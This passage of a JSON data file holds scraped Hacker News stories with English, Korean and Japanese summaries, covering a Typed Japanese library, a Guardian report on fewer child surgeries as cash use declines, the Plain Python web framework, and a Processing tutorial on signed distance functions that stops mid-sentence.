      "ko": "타입 일본어는 TypeScript 라이브러리로, TypeScript의 타입 시스템을 이용해 완전한 일본어 문장을 표현할 수 있게 해줍니다. 일본어 문법 규칙을 따르며, TypeScript 컴파일러가 올바른지 검증할 수 있는 전문 언어를 만듭니다. 이 프로젝트는 AI가 일본어 문법을 분석할 수 있도록 구조화된 형식을 제공함으로써 언어 학습을 향상시키는 것을 목표로 하고 있습니다.\n\n이 라이브러리의 주요 기능 중 하나는 일본어 동사(고단, 이치단, 불규칙 동사)와 형용사(I형 형용사와 나형 형용사)를 지원하며, 다양한 활용 형태를 제공합니다. 사용자는 동사, 형용사, 조사 등을 사용해 문장을 만들 수 있어 유연한 문장 구조를 가능하게 합니다. 또한, 코딩을 통해 일본어 문법을 배우는 도구로 활용되어 사용자가 문법 규칙을 표현하고 검증할 수 있도록 돕습니다.\n\n기술적인 측면에서 이 라이브러리는 TypeScript의 고급 타입 기능을 사용하여 일본어 문법을 타입 수준에서 순수하게 표현합니다. 표준 언어 형태에 중점을 두지만, 모든 언어적 뉘앙스를 포괄하지는 않을 수 있습니다.\n\n제한 사항으로는 이 시스템이 타입 수준 표현에만 해당하며, 런타임 기능을 제공하지 않는 점이 있습니다. 또한, 드물거나 고풍스러운 언어 패턴을 정확하게 표현하지 못할 수도 있습니다.\n\n타입 일본어에 기여하거나 실험하려면 Node.js와 pnpm이 설치되어 있어야 하며, 이를 통해 테스트를 실행하고 시스템을 검증할 수 있습니다. 더 많은 정보는 자세한 블로그 포스트를 확인하거나 contact@typedgrammar.com으로 개발자에게 문의하면 됩니다. 이 프로젝트는 기여와 피드백을 환영합니다.",
      "ja": "Typed Japaneseは、TypeScriptの型システムを使って完全な日本語の文を表現できるライブラリです。日本語の文法ルールに従うことで、TypeScriptコンパイラによって正しさをチェックできる特化した言語を作成します。このプロジェクトは、AIが日本語の文法を分析できる構造化された形式を提供することで、言語学習の向上も目指しています。\n\nこのライブラリの主な特徴には、日本の動詞（五段動詞、一段動詞、不規則動詞）や形容詞（い形容詞、な形容詞）をサポートし、さまざまな活用形を提供することが含まれています。ユーザーは動詞、形容詞、助詞を使って文を作成でき、柔軟な文構造を実現します。また、コーディングを通じて日本語の文法を学ぶための教育ツールとしても機能します。\n\n技術的には、このライブラリはTypeScriptの高度な型機能を利用して、日本語の文法を型レベルで純粋に表現します。標準的な言語形式に焦点を当てていますが、すべての言語のニュアンスをカバーしているわけではありません。\n\n制限としては、このシステムは型レベルの表現のみに対応しており、実行時の機能は提供していません。また、稀な言語パターンや古風な表現を正確に表現できない場合があります。\n\nTyped Japaneseに貢献したり実験したりするには、Node.jsとpnpmをインストールしてテストを実行し、システムを検証する必要があります。詳細については、ブログ記事を確認するか、開発者にcontact@typedgrammar.comで連絡してください。このプロジェクトは貢献やフィードバックを歓迎しています。"
    }
  },
  {
    "id": "02fad9a787dd30d7",
    "title": {
      "en": "Decline of cash credited for drop in surgery for children swallowing objects",
      "ko": "현금 감소, 아동 수술 감소 원인",
      "ja": "現金減少で子供の手術減少"
    },
    "type": "story",
    "url": "https://www.theguardian.com/society/2025/mar/28/decline-of-cash-credited-for-drop-in-nhs-surgery-for-children-swallowing-objects",
    "score": 58,
    "by": "geox",
    "time": 1743278683,
    "content": "Historically, coins accounted for more than 75% of objects swallowed by children under six, the Royal College of Surgeons of England said. Photograph: fStop Images GmbH/AlamyView image in fullscreenHistorically, coins accounted for more than 75% of objects swallowed by children under six, the Royal College of Surgeons of England said. Photograph: fStop Images GmbH/AlamyChildrenDecline of cash credited for drop in NHS surgery for children swallowing objectsFigures reveal 29% fall in operations in England to remove foreign bodies from children’s airways, noses and throatsDenis Campbell Health policy editorFri 28 Mar 2025 00.01 GMTShareCashless societies may be a sad fact of modern life for those with a nostalgic attachment to the pound in their pocket, but doctors have discovered one unexpected benefit of the decline of coins.Far fewer children are having surgery after swallowing small items that could choke or kill them, and the scarcity of loose change is likely to be the reason.The number of children in England needing an operation to remove a foreign body from their nose, throat or airway fell significantly between 2012 and 2022, NHS figures show.The fall has been greeted with relief by doctors and surgeons, who for years have been warning of the dangers posed by young children ingesting magnets, tiny batteries and other risky objects.How Covid changed children in BritainRead moreThe number of under-18s undergoing surgery on their nose, airway or throat for that reason has declined from 2,405 in 2012 to 1,716 in 2022 – a fall of 29% or 689 cases in the year.The Royal College of Surgeons of England (RCSE), which obtained the figures, collated from hospital admission data, identified the rise of the cashless society as the main reason.“Historically, coins accounted for over 75% of objects swallowed by children under six years old, and fewer coins in homes due to contactless payments have likely helped reduce the number of these procedures,” it said.For example, surgeons performed 484 (31%) fewer procedures to remove something from a child’s nose in 2022 compared with 2012. There were 28% fewer on the digestive tract in the same age group and 8% fewer involving their airways.However, the RCSE said that, despite the drop, parents should still be alert to the risk of their child swallowing shiny objects that looked like coins, such as button batteries and magnets.“These can cause deadly internal complications within hours of ingestion, leading to tragic consequences,” it added.This week, reports told how one-year-old Araya Whateley had to have her bowel removed after ingesting six metal balls from a toy belonging to her nine-year-old sister.skip past newsletter promotionSign up to First EditionFree daily newsletterOur morning email breaks down the key stories of the day, telling you what’s happening and why it mattersEnter your email address Sign upPrivacy Notice: Newsletters may contain info about charities, online ads, and content funded by outside parties. For more information see our Privacy Policy. We use Google reCaptcha to protect our website and the Google Privacy Policy and Terms of Service apply.after newsletter promotionRecord 4.5m children in poverty in UK as cuts condemned as ‘morally repugnant’Read moreParents who suspect their child may have ingested something dangerous should take them straight to hospital to get checked out, according to the body that represents Britain’s A&E doctors.“If any carer thinks a child has swallowed an item they shouldn’t have, take them to A&E – even if they have no symptoms. In cases like this, it really is better to be safe than sorry,” said Dr Adrian Boyle, the president of the Royal College of Emergency Medicine.“As a parent, I know we all do our best to be vigilant as to what our children are putting in their mouths. But it is impossible to monitor them all the time.”Prof Stephen Powis, NHS England’s national medical director, said: “At a time when demand on NHS services is so high, trends like this one which reduces hospital attendances is not only good for children, but also for our under-pressure staff.”Explore more on these topicsChildrenHealthHospitalsNHSEnglandnewsShareReuse this content",
    "summary": {
      "en": "The decline in cash usage has led to fewer children swallowing dangerous objects, resulting in a significant drop in surgeries in England. Historically, over 75% of items swallowed by children under six were coins. Between 2012 and 2022, surgeries for removing foreign bodies from children’s airways, noses, and throats decreased by 29%, from 2,405 to 1,716 cases. The Royal College of Surgeons attributes this decline to the reduced number of coins in homes due to the rise of contactless payments.\n\nWhile this trend is welcomed by doctors, they warn that parents should remain vigilant about other small, shiny objects like button batteries and magnets, which can also pose serious risks. If parents suspect their child has swallowed something harmful, they should take them to the hospital immediately. Overall, this decrease in surgeries not only benefits children's health but also eases pressure on NHS services.",
      "ko": "현금 사용의 감소는 어린이들이 위험한 물건을 삼키는 사례를 줄여, 영국에서 수술 건수가 크게 감소하는 결과를 가져왔습니다. 역사적으로, 여섯 살 이하 어린이들이 삼킨 물건의 75% 이상이 동전이었습니다. 2012년부터 2022년 사이에 어린이의 기도, 코, 목에서 이물질을 제거하는 수술 건수는 29% 감소하여 2,405건에서 1,716건으로 줄어들었습니다. 영국 외과 의사 협회는 이러한 감소가 비접촉식 결제의 증가로 인해 가정에서 동전의 수가 줄어든 것과 관련이 있다고 설명했습니다.\n\n이러한 추세는 의사들에게 환영받고 있지만, 부모들은 버튼 배터리나 자석과 같은 다른 작은 반짝이는 물건에 대해서도 경각심을 가져야 한다고 경고합니다. 이들 물건 역시 심각한 위험을 초래할 수 있습니다. 만약 부모가 자녀가 해로운 물질을 삼켰다고 의심된다면, 즉시 병원으로 데려가야 합니다. 전반적으로 수술 건수의 감소는 어린이의 건강에 긍정적인 영향을 미칠 뿐만 아니라 NHS 서비스에 대한 부담도 덜어줍니다.",
      "ja": "現金の使用が減少したことで、子供が危険な物を飲み込むケースが減り、イギリスでは手術の件数が大幅に減少しています。過去には、6歳未満の子供が飲み込む物の75%以上が硬貨でしたが、2012年から2022年の間に、子供の気道や鼻、喉から異物を取り除く手術の件数は29%減少し、2,405件から1,716件にまで減りました。外科医の学会は、この減少の原因を、非接触型決済の普及による家庭内の硬貨の減少にあるとしています。\n\nこの傾向は医師たちに歓迎されていますが、親はボタン電池や磁石などの小さくて光る物にも注意を払うべきだと警告しています。これらもまた、深刻な危険をもたらす可能性があります。もし親が子供が有害な物を飲み込んだと疑った場合は、すぐに病院に連れて行くべきです。全体として、手術の減少は子供の健康に良い影響を与えるだけでなく、NHSのサービスへの負担も軽減しています。"
    }
  },
  {
    "id": "e1e3e76d805eb187",
    "title": {
      "en": "Plain – a web framework for building products with Python",
      "ko": "플레인: 파이썬으로 제품 만들기",
      "ja": "プレーン：Python製品開発フレームワーク"
    },
    "type": "story",
    "url": "https://plainframework.com/",
    "score": 281,
    "by": "brylie",
    "time": 1743220502,
    "content": "Plain\n\n        A web framework for building products with Python.\n\n            Clone a starter kit →\n\n        Leverage the world's most popular programming language\n\n            Plain is a fork of Django,\n            bringing new ideas to established patterns in the Python landscape.\n            Build a new business, an internal tool, or something for yourself.\n\n            Entrepreneurial\n\n                Plain was forked inside of PullApprove — a revenue-generating SaaS with Fortune 500 customers.\n\n            End-to-end\n\n                Local development with a single command.\n                Go to production with dashboards, feature flags, and more.\n\n            Ecosystem\n\n                Plain is split into multiple first-party packages.\n                Major features are optional and new ideas can evolve independently.\n\n            Foundation Packages\n            Building blocks for products\n\n                    plain\n\n                        The foundations for shipping Python code to the web — urls, views, templates, forms, and more.\n\n                    plain.models\n\n                        Store your data in Postgres, MySQL, or SQLite with a tried and true ORM.\n\n                    plain.cache\n\n                        A caching solution designed just to work with your existing database.\n\n                    plain.email\n\n                        App-wide email configuration and sending, with templates and attachments.\n\n                    plain.sessions\n\n                        Read and write to database-backed sessions.\n\n                    plain.worker\n\n                        An official solution for background work, backed by the database you already have.\n\n                    plain.api\n\n                        Build JSON APIs with the same class-based view architecture you already know.\n\n                Browse source docs →\n\n            Auth Packages\n            Authentication you can trust (and host yourself)\n\n                    plain.auth\n\n                        The foundation for adding users to your app, authenticating them to requests and restricting views.\n\n                    plain.oauth\n\n                        A flexible OAuth solution to support modern social logins and API access.\n\n                    plain.passwords\n\n                        Password-based login that works like it always has, if you want it.\n\n                    plain.loginlink\n\n                        Send one-time login links to users, and let them log in without a password.\n\n                    plain.passkeys coming soon\n\n                        Passwordless login with passkeys.\n\n                Browse source docs →\n\n            Admin Packages\n            The backbone of your back office\n\n                    plain.admin\n\n                        An admin dashboard you can fully customize, and Plain packages know how to integrate with.\n\n                    plain.flags\n\n                        Database-backed feature flags to control who sees what and quietly deploy progress.\n\n                    plain.support\n\n                        Provide better customer support without the need for third-party services.\n\n                    plain.redirection\n\n                        Monitor 404s and manage redirects in the database.\n\n                    plain.pageviews\n\n                        See what users are looking at, and provide better support.\n\n                Browse source docs →\n\n            Dev Packages\n            A tailored local development experience\n\n                    plain.dev\n\n                        Fire up your local development environment with a single command.\n\n                    plain.pytest\n\n                        Write and run tests with one of Python's most popular testing libraries.\n\n                    plain.code\n\n                        Format and lint your Python code with opinionated defaults.\n\n                    plain.tunnel\n\n                        Expose your local app to the internet to build webhook integrations.\n\n                Browse source docs →\n\n            Frontend Packages\n            Modern tools for modern user interfaces\n\n                    plain.tailwind\n\n                        First-class integration for everyone's favorite CSS framework. Node.js not required.\n\n                    plain.htmx\n\n                        Build a modern user experience with the tools you already know.\n\n                    plain.elements\n\n                        A new paradigm for reusable components across your app's templates.\n\n                    plain.pages\n\n                        File-based routing for marketing sites and documentation, using HTML and Markdown.\n\n                    plain.esbuild\n\n                        A simplified build process for JavaScript that needs to be compiled.\n\n                    plain.vendor\n\n                        Download and self-host JavaScript and CSS assets without depending on a CDN.\n\n                Browse source docs →",
    "summary": {
      "en": "**Summary of Plain Web Framework**\n\nPlain is a web framework for building products using Python, designed as a fork of Django. It aims to introduce new ideas while following established patterns, making it ideal for creating businesses, internal tools, or personal projects.\n\n**Key Features:**\n\n- **Origin:** Developed within PullApprove, a successful SaaS company with major clients.\n- **Development:** Offers easy local development with a single command and supports production deployment with features like dashboards and feature flags.\n- **Modularity:** Plain consists of various packages that cover different functionalities, allowing for flexible use of major features.\n\n**Core Packages:**\n\n1. **Foundation Packages:** Basic tools for web development, including URL handling, data storage (with ORM), caching, email services, session management, and JSON API creation.\n   \n2. **Auth Packages:** Reliable authentication options, including user management, OAuth for social logins, traditional password logins, one-time login links, and upcoming passwordless login with passkeys.\n\n3. **Admin Packages:** Tools for building customizable admin dashboards, feature flags, customer support, redirect management, and user activity tracking.\n\n4. **Dev Packages:** Enhancements for local development, including environment setup, testing, code formatting, and tunneling for external access.\n\n5. **Frontend Packages:** Modern tools for user interfaces, featuring integration with popular CSS frameworks, reusable components, file-based routing, and simplified JavaScript building.\n\nPlain is designed to be user-friendly, making it a solid choice for developers looking to create web applications efficiently.",
      "ko": "Plain은 파이썬을 사용하여 제품을 구축하기 위한 웹 프레임워크로, Django에서 파생된 것입니다. 기존의 패턴을 따르면서 새로운 아이디어를 도입하는 것을 목표로 하여, 비즈니스, 내부 도구 또는 개인 프로젝트를 만드는 데 적합합니다.\n\nPlain의 주요 특징 중 하나는 PullApprove라는 성공적인 SaaS 회사 내에서 개발되었다는 점입니다. 이 회사는 주요 고객을 보유하고 있습니다. Plain은 단일 명령어로 쉽게 로컬 개발을 지원하며, 대시보드와 기능 플래그와 같은 기능을 통해 프로덕션 배포도 지원합니다. 또한, 다양한 패키지로 구성되어 있어 주요 기능을 유연하게 사용할 수 있는 모듈성을 제공합니다.\n\nPlain의 핵심 패키지에는 여러 가지가 있습니다. 첫 번째는 기본 웹 개발 도구를 포함하는 기초 패키지로, URL 처리, 데이터 저장(ORM 포함), 캐싱, 이메일 서비스, 세션 관리, JSON API 생성 등을 제공합니다. 두 번째는 신뢰할 수 있는 인증 옵션을 제공하는 인증 패키지로, 사용자 관리, 소셜 로그인을 위한 OAuth, 전통적인 비밀번호 로그인, 일회성 로그인 링크, 그리고 곧 제공될 비밀번호 없는 로그인 기능인 패스키를 포함합니다.\n\n세 번째는 사용자 정의 가능한 관리자 대시보드를 구축할 수 있는 도구를 제공하는 관리자 패키지입니다. 여기에는 기능 플래그, 고객 지원, 리디렉션 관리, 사용자 활동 추적 기능이 포함됩니다. 네 번째는 로컬 개발을 위한 향상된 기능을 제공하는 개발 패키지로, 환경 설정, 테스트, 코드 포맷팅, 외부 접근을 위한 터널링 기능이 포함되어 있습니다. 마지막으로, 사용자 인터페이스를 위한 현대적인 도구를 제공하는 프론트엔드 패키지가 있으며, 인기 있는 CSS 프레임워크와의 통합, 재사용 가능한 컴포넌트, 파일 기반 라우팅, 간소화된 자바스크립트 빌드를 지원합니다.\n\nPlain은 사용자 친화적으로 설계되어 있어, 효율적으로 웹 애플리케이션을 만들고자 하는 개발자들에게 훌륭한 선택이 될 수 있습니다.",
      "ja": "Plainは、Pythonを使用して製品を構築するためのウェブフレームワークで、Djangoを基にした派生版です。確立されたパターンに従いながら新しいアイデアを取り入れることを目指しており、ビジネスや内部ツール、個人プロジェクトの作成に最適です。\n\nPlainの開発は、主要なクライアントを持つ成功したSaaS企業であるPullApprove内で行われました。ローカル開発は簡単なコマンド一つで行え、ダッシュボードや機能フラグなどの機能を使って本番環境へのデプロイもサポートしています。また、Plainはさまざまな機能をカバーするパッケージで構成されており、主要な機能を柔軟に利用できるようになっています。\n\nPlainのコアパッケージには、基本的なウェブ開発ツールを提供するファウンデーションパッケージ、ユーザー管理やソーシャルログイン用のOAuth、従来のパスワードログイン、一回限りのログインリンク、今後提供予定のパスキーを使ったパスワードレスログインを含む信頼性の高い認証オプションを提供する認証パッケージ、カスタマイズ可能な管理ダッシュボードや機能フラグ、顧客サポート、リダイレクト管理、ユーザー活動の追跡ツールを含む管理パッケージ、環境設定やテスト、コードフォーマット、外部アクセスのためのトンネリングを含むローカル開発を強化する開発パッケージ、人気のCSSフレームワークとの統合や再利用可能なコンポーネント、ファイルベースのルーティング、簡素化されたJavaScriptビルドを特徴とするフロントエンドパッケージがあります。\n\nPlainは使いやすさを重視して設計されており、効率的にウェブアプリケーションを作成したい開発者にとって、堅実な選択肢となっています。"
    }
  },
  {
    "id": "bc5d315def688e93",
    "title": {
      "en": "The Wrong Way to Use a Signed Distance Function (SDF)",
      "ko": "SDF 잘못 쓰기",
      "ja": "SDFの誤用法"
    },
    "type": "story",
    "url": "https://winterbloed.be/the-wrong-way-to-use-a-signed-distance-function/",
    "score": 29,
    "by": "AnthonBerg",
    "time": 1743271807,
    "content": "The wrong way to use a signed distance function (sdf)\n\nDisclaimer: there’s nothing wrong with using a sdf this way.\n\nRecently, my good friend Mike Brondbjerg posted this on Twitter:\n\nDark Matter: 50,000 particles passing through a field until they hit a hidden sphere. By varying the distance travelled each step, the collisions are more / less accurate, so creating a nice fuzziness around the spheres. #generative #design #creativecommuting #creativecoding pic.twitter.com/gmFEV7fCwk— Mike Brondbjerg (@mikebrondbjerg) January 15, 2020\n\nYou can follow along and see how this idea is evolving into the beautiful, elegant line drawings that are the hallmark of his style.\n\nDark Matter: random walk obstacle avoidance… nice random output. #creativecoding #generative #design #processing pic.twitter.com/DTzy7H2G6Z— Mike Brondbjerg (@mikebrondbjerg) January 26, 2020\n Spheres\nMike’s post gave me an idea, a way to introduce a concept I like to use in some of my work: signed distance functions. Sdfs are more commonly associated with raytracing and shaders, and by far the best source to learn about them in that context is Inigo Quilez, of Shadertoy fame:  https://iquilezles.org/.\nBut there is a delightfully wrong way to use a sdf. Their primary use in raytracing and shaders is to define meshless geometry. For example, a way to draw smooth spheres without generating a ton of triangles. The use I’m showing here is the exact opposite: to generate geometry, point clouds in fact. Geometry that then needs to be processed in a conventional way before it can be rendered on the screen.\nLet’s imagine we want to tackle something similar to the tweet: particles colliding with a sphere. One way to do this is by calculating the distance of the particle to the center of the sphere, let’s keep it at the origin. For a particle  p⃗ \\vec{p} p  at position (x,y,z)(x,y,z)(x,y,z) , this distance is given by: d(p⃗)=x.x+y.y+z.z {d( \\vec{p} )=\\sqrt{x.x+y.y+z.z}}d(p)=x.x+y.y+z.z. If that distance   ddd is larger than the radius  r rr  of the sphere, the particle is outside the sphere, if it’s smaller then it is inside, if it’s exactly the same then it is on the surface.\n\n{d(p⃗)<r,ifp⃗isinsided(p⃗)=r,ifp⃗isonsphered(p⃗)>r,ifp⃗isoutside\\begin{cases}  d( \\vec{p} )<r, & \\text{if }  \\vec{p}\\text{ is inside} \\\\  d( \\vec{p} )=r , & \\text{if }  \\vec{p}\\text{ is on sphere}\\\\  d( \\vec{p} )>r, & \\text{if }  \\vec{p}\\text{ is outside}  \\end{cases}⎩⎪⎪⎨⎪⎪⎧d(p)<r,d(p)=r,d(p)>r,ifpisinsideifpisonsphereifpisoutside\n\nUsing this, we can check the particles every step. As long as their distance to the sphere is larger than the radius, they’re fine. If a particle takes a step and its distance becomes smaller or equal, it has hit the sphere.\n\n A grid of particles flying into a sphere. Some have collided with the sphere, the rest is zooming off into infinity.\nIf the sphere is not in the origin but centered in a point c⃗(cx,cy,cz) \\vec{c} (cx,cy,cz)  c(cx,cy,cz)  the distance function becomes  d(p⃗,c⃗)=(x−cx).(x−cx)+(y−cy).(y−cy)+(z−cz).(z−cz) {d( \\vec{p} , \\vec{c} )=\\sqrt{(x-cx).(x-cx)+(y-cy).(y-cy)+(z-cz).(z-cz)}}d(p,c)=(x−cx).(x−cx)+(y−cy).(y−cy)+(z−cz).(z−cz). Typically, this is explained as the length of the vector going from  p⃗ \\vec{p} p  to c⃗  \\vec{c} c. Another way to see it, that will serve us well further on, is to imagine that we shift the sphere to the origin,   c⃗→0⃗ \\vec{c}\\to\\vec{0}   c→0, and the entire space moves with it . Our particle is then moved  p⃗→p⃗−c⃗  \\vec{p}\\to\\vec{p}-\\vec{c} p→p−c. Checking a particle at  p⃗ \\vec{p} p  against a sphere in center  c⃗ \\vec{c} c  is the same as doing it for a particle at  p⃗−c⃗  \\vec{p}-\\vec{c} p−c against a sphere in the origin.\nSince we can put the sphere wherever we want, we can add multiple spheres. Each particle is then tested against the different spheres one by one.\n\n A grid of particles flying into a bunch of spheres.\n\nDistance Fields\nIn creative coding, it is often useful to have several perspectives to look at things. The equations above can be refactored:\n\n{d(p⃗)−r<0,ifp⃗isinsided(p⃗)−r=0,ifp⃗isonsphered(p⃗)−r>0,ifp⃗isoutside\\begin{cases}  d( \\vec{p} )-r<0, & \\text{if }  \\vec{p}\\text{ is inside} \\\\  d( \\vec{p} )-r=0 , & \\text{if }  \\vec{p}\\text{ is on sphere}\\\\  d( \\vec{p} )-r>0, & \\text{if }  \\vec{p}\\text{ is outside}  \\end{cases}⎩⎪⎪⎨⎪⎪⎧d(p)−r<0,d(p)−r=0,d(p)−r>0,ifpisinsideifpisonsphereifpisoutside\n\nNothing has really changed, the equations are still the same. But what they describe is a function  d(p⃗)−r {d( \\vec{p} )-r}d(p)−r that separates space in three regions: one region outside the sphere, with positive values; one region inside the sphere, with negative values; and the surface of the sphere itself, where the function equals zero. This is the signed distance function of a sphere in the origin, with radius   r  r r .\nTesting the particles at each step is essentially the same evaluation: calculate the function at  p⃗ \\vec{p} p and see how it classifies. The advantage of seeing it this way is that the signed distance function can be easily replaced, and suddenly we’re checking collisions with a box, a torus, or any of the many shapes that have a well-defined sdf, like the list Inigo keeps.\n\n A grid of particles flying into a bunch of boxes.\nIn itself, there’s nothing stopping us from using the first approach to calculate the distance of a point to some specific geometry. But I find sdfs make it more intuitive, especially when we start modifying and combining them.\nNot every function is a signed distance function, there are certain requirements. I’m not going into the rigorous math details, mainly because I’m not qualified enough to pull that off. In essence, its rate of change has to correspond to what you expect for a distance. If we follow the slope of the function downwards, we expect to end up at the surface. If we take small steps towards it, the distance should decrease with small steps, not suddenly change slope or start increasing.\nAs a creative coder, one of the first things we think of is “add noise”, which is not a mathematically valid distance function. Adding noise to the sdf of a sphere doesn’t give us the sdf of a noisy sphere. Fortunately, as creative coders, we can choose to forego the rigor and let the mayhem surprise us.\n\nNoise might not be a valid distance function, but it’s still fun to use.\nTracer classes\nAlthough a lot of information and functions are available online, it might not be immediately clear how to use any of it in Processing. Typically, code is given in OpenGL Shading Language (GLSL) and the used functions aren’t always obvious. GLSL is created to deal with numbers and vectors in a unified way. A function like max(v,0.0) looks familiar but in GLSL can also work component-wise on vectors, something that Processing doesn’t handle. Transcribing sdf functions can be confusing when unfamiliar with GLSL.\nIn this section, we’ll be creating the code used for the images above. In the end, we will have a rudimentary framework to build on for more complex pieces. Let’s start with some convenience classes, Point and Vector.\n\nJava\n\n\t\t\tclass Point {\n  float x, y, z;\n  Point(float x, float y, float z) {\n    this.x=x;\n    this.y=y;\n    this.z=z;\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n\nclass Point {\n\nfloat x, y, z;\n\nPoint(float x, float y, float z) {\n\nthis.x=x;\n\nthis.y=y;\n\nthis.z=z;\n\n}\n\n}\n\nJava\n\n\t\t\tclass Vector {\n  float x, y, z;\n  Vector(float x, float y, float z) {\n    this.x=x;\n    this.y=y;\n    this.z=z;\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n\nclass Vector {\n\nfloat x, y, z;\n\nVector(float x, float y, float z) {\n\nthis.x=x;\n\nthis.y=y;\n\nthis.z=z;\n\n}\n\n}\n\nBoth are just containers for coordinates. There is no real reason why we can’t use Processing PVector for this, or why we have both Point and Vector. But for this tutorial, it is easier to talk about points and vectors with as little abstraction as possible.\nAnother class that will come in handy is Ray, a half-line starting at a Point origin, the direction is given by the Vector direction. On creation, direction is normalized, its length is rescaled to 1.0. The function get(t) will return a new Point on the ray, a distance t from its origin.\n\nJava\n\n\t\t\tclass Ray {\n  Point origin;\n  Vector direction;\n\n  Ray(Point origin, Vector direction) {\n    this.origin=new Point(origin.x, origin.y, origin.z);\n    float mag=direction.x*direction.x+direction.y*direction.y+direction.z*direction.z;\n    assert(mag&gt;0.000001);\n    mag=1.0/sqrt(mag);\n    this.direction=new Vector(direction.x*mag, direction.y*mag, direction.z*mag);\n  }\n\n  //Get point on ray at distance t from origin\n  Point get(float t) {\n    return new Point(origin.x+t*direction.x, origin.y+t*direction.y, origin.z+t*direction.z);\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\nclass Ray {\n\nPoint origin;\n\nVector direction;\n\nRay(Point origin, Vector direction) {\n\nthis.origin=new Point(origin.x, origin.y, origin.z);\n\nfloat mag=direction.x*direction.x+direction.y*direction.y+direction.z*direction.z;\n\nassert(mag&gt;0.000001);\n\nmag=1.0/sqrt(mag);\n\nthis.direction=new Vector(direction.x*mag, direction.y*mag, direction.z*mag);\n\n}\n\n//Get point on ray at distance t from origin\n\nPoint get(float t) {\n\nreturn new Point(origin.x+t*direction.x, origin.y+t*direction.y, origin.z+t*direction.z);\n\n}\n\n}\n\nFor our mini-framework, we need signed distance functions. We could hardwire the functions into a sdf(Point p) function and change that code every time. But, a bit of structure goes a long way to help exploration. First, we need to tell Processing/JAVA what a signed distance function is:\n\nJava\n\n\t\t\t//Interface that implements a signed distance function\ninterface SDF {\n  float signedDistance(Point p);\n}\n\n1\n2\n3\n4\n\n//Interface that implements a signed distance function\n\ninterface SDF {\n\nfloat signedDistance(Point p);\n\n}\n\nDon’t worry if the details on what an interface is aren’t clear. We can consider it a promise to Processing: everything we identify as a SDF will have this function signedDistance(Point p) that returns a float. It doesn’t matter what class it is precisely, how we create objects of that class, how the object calculates the distance, as long as we tell Processing it’s an SDF, it will be able to call that function. An interface can be used to define variables, to pass objects to functions, pretty much everywhere we can use a class. What we can’t do, is create a new object with new SDF().\nWe already encountered one signed distance function, that of a sphere at the origin with radius r,  d(p⃗)−r {d( \\vec{p} )-r}d(p)−r. We can now implement a class that encapsulates this.\n\nJava\n\n\t\t\t/*\nGLSL code https://iquilezles.org/www/articles/distfunctions/distfunctions.htm\nfloat sdSphere( vec3 p, float s )\n{\n  return length(p)-s;\n}\n*/\n\nclass SphereSDF implements SDF {\n  float radius;\n\n  SphereSDF(float r) {\n    radius=r;\n  }\n\n  float signedDistance(Point p) {\n    return sqrt(sq(p.x)+sq(p.y)+sq(p.z))-radius;\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n/*\nGLSL code https://iquilezles.org/www/articles/distfunctions/distfunctions.htm\nfloat sdSphere( vec3 p, float s )\n{\nreturn length(p)-s;\n}\n*/\n\nclass SphereSDF implements SDF {\n\nfloat radius;\n\nSphereSDF(float r) {\n\nradius=r;\n\n}\n\nfloat signedDistance(Point p) {\n\nreturn sqrt(sq(p.x)+sq(p.y)+sq(p.z))-radius;\n\n}\n\n}\n\nWe tell Processing that this class implements SDF. In return, we need to fulfill our promise and implement  signedDistance(Point p) . Everywhere Processing expects a SDF we can now pass a SphereSDF and it will work.\nSimilarly, we can define the sdf of a box at the origin of size X, Y, and Z.\n\nJava\n\n\t\t\t/*\nGLSL code https://iquilezles.org/www/articles/distfunctions/distfunctions.htm\nfloat sdBox( vec3 p, vec3 b )\n{\n  vec3 q = abs(p) - b;\n  return length(max(q,0.0)) + min(max(q.x,max(q.y,q.z)),0.0);\n}\n*/\n\nclass BoxSDF implements SDF {\n  float X, Y, Z;\n\n  BoxSDF(float x, float y, float z) {\n    X=x;\n    Y=y;\n    Z=z;\n  }\n\n  float signedDistance(Point p) {\n    float qx=abs(p.x)-X;\n    float qy=abs(p.y)-Y;\n    float qz=abs(p.z)-Z;\n    return sqrt(sq(max(qx,0.0))+sq(max(qy,0.0))+sq(max(qz,0.0)))+min(max(qx, qy, qz), 0.0);\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n/*\nGLSL code https://iquilezles.org/www/articles/distfunctions/distfunctions.htm\nfloat sdBox( vec3 p, vec3 b )\n{\nvec3 q = abs(p) - b;\nreturn length(max(q,0.0)) + min(max(q.x,max(q.y,q.z)),0.0);\n}\n*/\n\nclass BoxSDF implements SDF {\n\nfloat X, Y, Z;\n\nBoxSDF(float x, float y, float z) {\n\nX=x;\n\nY=y;\n\nZ=z;\n\n}\n\nfloat signedDistance(Point p) {\n\nfloat qx=abs(p.x)-X;\n\nfloat qy=abs(p.y)-Y;\n\nfloat qz=abs(p.z)-Z;\n\nreturn sqrt(sq(max(qx,0.0))+sq(max(qy,0.0))+sq(max(qz,0.0)))+min(max(qx, qy, qz), 0.0);\n\n}\n\n}\n\nOne piece missing, the particles. We’re going to shoot particles, Tracers, into the scene along straight paths. When they hit something, they stop. Otherwise, they come to a stop after a certain distance. If our collision geometry would be defined by meshes, we could try to intersect the ray of the particles with the faces of the geometry. However, in this case, the whole point of this tutorial after all, we define the geometry by signed distance functions. So, we will be using another technique of finding collisions: sphere tracing.\nImagine we have an arbitrary collision geometry defined by a sdf and assume we have some particles starting outside this geometry. We know that in every point in space we can calculate the signed distance sdf(p⃗)  {sdf( \\vec{p} )} sdf(p).  That distance, let’s call it  d d  d , tells us how close the geometry is to the point, but it doesn’t give us a direction. The only thing we can say is that the particle can safely move in any direction over a distance  d d  d. In other words, we know that at that point we can put a sphere of radius   d d  d and know for sure that the geometry isn’t in that sphere. In the extreme case, if the particle is moving straight towards the geometry, it might end up directly on the surface, but it will never cross it or go inside.\nTake the figure below. We start at  P0  P_{0} P0 and the chosen direction is along the blue line. The black triangle and rectangle are our collision geometry.  sdf(P0)  sdf( P_{0}) sdf(P0) tells us it that it is safe to move anywhere in the green circle centered on P0 P_{0} P0.\n\n https://demosceneacademy.wordpress.com/\nIf we take a big step, the maximum safe distance, along the blue line, we end up in  P1 P_{1}  P1.  sdf(P1)  sdf( P_{1}) sdf(P1) isn’t 